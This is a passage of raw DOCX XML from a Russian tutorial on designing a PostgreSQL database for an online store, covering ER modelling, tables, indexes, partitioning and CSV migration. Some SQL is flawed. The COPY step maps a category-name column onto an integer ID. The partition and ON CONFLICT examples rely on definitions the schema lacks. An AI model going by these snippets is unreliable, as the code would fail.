      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сайт должен работать 24/7</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Время загрузки страницы: до 1 секунды</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Безопасность: пароли хешируются, платёжные данные не хранятся (используем Stripe/PayPal)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Вывод:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Нужна реляционная БД (PostgreSQL или MySQL), структура данных простая, нагрузка небольшая.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фаза 2: Проектирование БД (Database Design)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Это самая важная фаза. Плохо спроектировал — потом будешь месяцами рефакторить.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Проектирование делится на </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>три подэтапа</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.1. Концептуальное проектирование (Conceptual Design)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Рисуем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>ER-диаграмму</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (Entity-Relationship, сущность-связь). Определяем сущности и связи между ними. Пока не думаем о конкретной СУБД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Сущности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это объекты предметной области:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь (User)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Товар (Product)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказ (Order)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Категория (Category)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Связи</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — как сущности взаимодействуют:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Пользователь **размещает** Заказ (один ко многим, 1:N)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Заказ **содержит** Товары (многие ко многим, M:N)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Товар **принадлежит** Категории (многие к одному, N:1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 2: ER-диаграмма интернет-магазина</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>[User] ──(1)──────(N)── [Order]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   │                        │</w:t>
        <w:br/>
        <w:t xml:space="preserve">   │                        │</w:t>
        <w:br/>
        <w:t xml:space="preserve">   └── email, password      └── order_date, total_price</w:t>
        <w:br/>
        <w:t xml:space="preserve">       name, address</w:t>
        <w:br/>
        <w:t xml:space="preserve">       </w:t>
        <w:br/>
        <w:t>[Product] ──(N)──────(M)── [Order] (связь M:N через промежуточную таблицу)</w:t>
        <w:br/>
        <w:t xml:space="preserve">   │</w:t>
        <w:br/>
        <w:t xml:space="preserve">   └── name, price, stock_quantity, image_url</w:t>
        <w:br/>
        <w:br/>
        <w:t>[Category] ──(1)──────(N)── [Product]</w:t>
        <w:br/>
        <w:t xml:space="preserve">   │</w:t>
        <w:br/>
        <w:t xml:space="preserve">   └── category_name</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правила:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один пользователь может сделать много заказов (1:N)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один заказ содержит много товаров, и один товар может быть в разных заказах (M:N)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Один товар принадлежит одной категории, но в категории много товаров (N:1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.2. Логическое проектирование (Logical Design)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Переводим ER-диаграмму в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>таблицы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> реляционной модели. Определяем первичные и внешние ключи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Правила преобразования:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждая сущность → таблица</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Каждый атрибут сущности → поле таблицы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Связь 1:N → внешний ключ в таблице "многие"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Связь M:N → отдельная промежуточная таблица</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 3: Таблицы интернет-магазина</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `users`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>user_id (INT, PRIMARY KEY)  ← первичный ключ</w:t>
        <w:br/>
        <w:t>email (VARCHAR, UNIQUE)</w:t>
        <w:br/>
        <w:t>password_hash (VARCHAR)</w:t>
        <w:br/>
        <w:t>name (VARCHAR)</w:t>
        <w:br/>
        <w:t>address (TEXT)</w:t>
        <w:br/>
        <w:t>created_at (TIMESTAMP)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `products`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>product_id (INT, PRIMARY KEY)</w:t>
        <w:br/>
        <w:t>category_id (INT, FOREIGN KEY → categories.category_id)</w:t>
        <w:br/>
        <w:t>name (VARCHAR)</w:t>
        <w:br/>
        <w:t>price (DECIMAL)</w:t>
        <w:br/>
        <w:t>stock_quantity (INT)</w:t>
        <w:br/>
        <w:t>image_url (VARCHAR)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `categories`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>category_id (INT, PRIMARY KEY)</w:t>
        <w:br/>
        <w:t>category_name (VARCHAR)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Таблица `orders`:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>order_id (INT, PRIMARY KEY)</w:t>
        <w:br/>
        <w:t>user_id (INT, FOREIGN KEY → users.user_id)</w:t>
        <w:br/>
        <w:t>order_date (TIMESTAMP)</w:t>
        <w:br/>
        <w:t>total_price (DECIMAL)</w:t>
        <w:br/>
        <w:t>status (ENUM: 'pending', 'paid', 'shipped', 'delivered')</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Промежуточная таблица `order_items`</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (связь M:N между orders и products):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>order_item_id (INT, PRIMARY KEY)</w:t>
        <w:br/>
        <w:t>order_id (INT, FOREIGN KEY → orders.order_id)</w:t>
        <w:br/>
        <w:t>product_id (INT, FOREIGN KEY → products.product_id)</w:t>
        <w:br/>
        <w:t>quantity (INT)</w:t>
        <w:br/>
        <w:t>price (DECIMAL)  ← цена на момент заказа (может измениться)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Почему отдельная таблица `order_items`?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Потому что связь M:N (один заказ может содержать много товаров, один товар может быть в разных заказах). Без промежуточной таблицы это не представить.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2.3. Физическое проектирование (Physical Design)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Оптимизируем под конкретную СУБД. Определяем индексы, разделение на партиции, типы данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Индексы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — ускоряют поиск. Без индекса БД будет сканировать всю таблицу (медленно).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 4: Какие индексы создать?</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Часто ищем пользователя по email</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_users_email ON users(email);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Часто ищем товары по категории</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_products_category ON products(category_id);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Часто выбираем заказы конкретного пользователя</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_orders_user ON orders(user_id);</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Часто ищем товары по названию</w:t>
        <w:br/>
        <w:t>CREATE INDEX idx_products_name ON products(name);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Типы данных:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`INT` — для ID (занимает 4 байта, диапазон: -2 млрд до +2 млрд)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`BIGINT` — если ID больше 2 млрд (8 байт)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`VARCHAR(255)` — для строк переменной длины</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`TEXT` — для длинных текстов (адрес, описание)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`DECIMAL(10, 2)` — для цен (10 цифр всего, 2 после запятой: 12345678.99)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`TIMESTAMP` — для дат и времени</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Партиционирование (Partitioning):</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> разделение больших таблиц на части.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Если у тебя 100 миллионов заказов за 10 лет, можно разделить таблицу по годам:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE orders_2024 PARTITION OF orders FOR VALUES FROM ('2024-01-01') TO ('2025-01-01');</w:t>
        <w:br/>
        <w:t>CREATE TABLE orders_2025 PARTITION OF orders FOR VALUES FROM ('2025-01-01') TO ('2026-01-01');</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Запросы будут работать только с нужной партицией → быстрее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фаза 3: Реализация (Implementation)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Создаём таблицы, определяем ограничения, выбираем СУБД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Выбор СУБД:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>| СУБД         | Плюсы                              | Минусы                          | Применение                     |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>|--------------|------------------------------------|---------------------------------|--------------------------------|</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>PostgreSQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | Мощная, open-source, JSONB, расширения | Сложнее настраивать             | Веб-приложения, аналитика      |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>MySQL</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">        | Популярная, простая, быстрая       | Меньше фич, чем PostgreSQL      | WordPress, веб-сайты           |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQLite</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">       | Не требует сервера, файловая       | Не для многопользовательских БД | Мобильные приложения, прототипы |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>SQL Server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">   | Интеграция с Microsoft, мощная     | Дорогая лицензия                | Корпоративные приложения       |</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">| </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Oracle</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">       | Максимум возможностей              | Очень дорогая                   | Банки, крупный бизнес          |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 5: Создание таблиц в PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>CREATE TABLE users (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    email VARCHAR(255) UNIQUE NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    password_hash VARCHAR(255) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(100),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    address TEXT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE categories (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    category_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    category_name VARCHAR(100) NOT NULL</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE products (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    product_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    category_id INT REFERENCES categories(category_id) ON DELETE SET NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    name VARCHAR(255) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price DECIMAL(10, 2) NOT NULL CHECK (price &gt;= 0),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    stock_quantity INT NOT NULL CHECK (stock_quantity &gt;= 0),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    image_url VARCHAR(255)</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE orders (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    user_id INT REFERENCES users(user_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    total_price DECIMAL(10, 2) NOT NULL,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    status VARCHAR(20) DEFAULT 'pending'</w:t>
        <w:br/>
        <w:t>);</w:t>
        <w:br/>
        <w:br/>
        <w:t>CREATE TABLE order_items (</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_item_id SERIAL PRIMARY KEY,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    order_id INT REFERENCES orders(order_id) ON DELETE CASCADE,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    product_id INT REFERENCES products(product_id) ON DELETE RESTRICT,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    quantity INT NOT NULL CHECK (quantity &gt; 0),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    price DECIMAL(10, 2) NOT NULL</w:t>
        <w:br/>
        <w:t>);</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ограничения:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`PRIMARY KEY` — уникальный идентификатор строки</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`FOREIGN KEY` — связь между таблицами</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`NOT NULL` — поле обязательно к заполнению</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`UNIQUE` — значение должно быть уникальным</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`CHECK` — проверка условия (цена &gt;= 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ON DELETE CASCADE` — при удалении пользователя удалить его заказы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>`ON DELETE RESTRICT` — нельзя удалить товар, если он есть в заказах</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Фаза 4: Заполнение данными (Data Loading)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Что делаем:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Импортируем данные из старых систем, CSV-файлов, Excel, других БД.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Источники данных:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Старая БД (миграция с MySQL на PostgreSQL)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Excel-таблицы (типичный ужас малого бизнеса)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>CSV-файлы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>JSON/XML из API</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Ручной ввод (если данных мало)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Пример 6: Миграция из Excel в PostgreSQL</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Ситуация:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> У магазина был Excel-файл с товарами (products.xlsx):</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>| Название      | Цена  | Количество | Категория |</w:t>
        <w:br/>
        <w:t>|---------------|-------|------------|-----------|</w:t>
        <w:br/>
        <w:t>| Носки белые   | 150   | 100        | Одежда    |</w:t>
        <w:br/>
        <w:t>| Носки чёрные  | 180   | 50         | Одежда    |</w:t>
        <w:br/>
        <w:t>| Кружка синяя  | 300   | 30         | Посуда    |</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Шаги миграции:</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Экспортируем Excel в CSV:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>name,price,stock_quantity,category_name</w:t>
        <w:br/>
        <w:t>Носки белые,150,100,Одежда</w:t>
        <w:br/>
        <w:t>Носки чёрные,180,50,Одежда</w:t>
        <w:br/>
        <w:t>Кружка синяя,300,30,Посуда</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>Загружаем CSV в PostgreSQL:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="NoSpacing"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>-- Сначала заполняем категории (уникальные)</w:t>
        <w:br/>
        <w:t xml:space="preserve">INSERT INTO categories (category_name) </w:t>
        <w:br/>
        <w:t>VALUES ('Одежда'), ('Посуда')</w:t>
        <w:br/>
        <w:t>ON CONFLICT DO NOTHING;</w:t>
        <w:br/>
        <w:br/>
        <w:t>-- Потом товары</w:t>
        <w:br/>
        <w:t>COPY products (name, price, stock_quantity, category_id)</w:t>
        <w:br/>
        <w:t>FROM '/path/to/products.csv'</w:t>
        <w:br/>
        <w:t>WITH (FORMAT csv, HEADER true);</w:t>
      </w:r>
